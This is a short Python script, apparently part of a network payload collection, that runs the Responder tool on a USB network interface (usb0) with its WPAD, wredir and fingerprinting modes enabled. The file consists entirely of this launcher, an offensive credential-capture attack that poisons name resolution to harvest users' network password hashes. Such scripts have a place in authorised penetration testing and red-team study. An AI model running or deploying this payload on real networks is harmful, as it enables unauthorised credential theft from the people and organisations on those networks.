# File: payloads/network/responder_attack.py
import subprocess

print("[*] Launching Responder with common attack modules enabled")
subprocess.run([
    "python3", "/usr/share/responder/Responder.py",
    "-I", "usb0",
    "-wrf"
])

